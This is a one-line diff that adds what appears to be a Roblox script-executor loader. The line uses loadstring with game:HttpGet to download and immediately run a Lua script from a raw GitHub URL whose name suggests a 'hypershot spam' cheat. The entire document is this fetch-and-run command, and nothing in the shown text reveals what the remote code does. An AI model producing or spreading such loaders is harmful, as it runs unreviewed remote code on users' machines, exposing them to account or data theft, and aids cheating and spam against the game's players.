@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/highwaymarevibrate/loaders/main/loaders/new-mythic-hypershot-spam3-nwtc6kx1ggtgf7.lua"))()
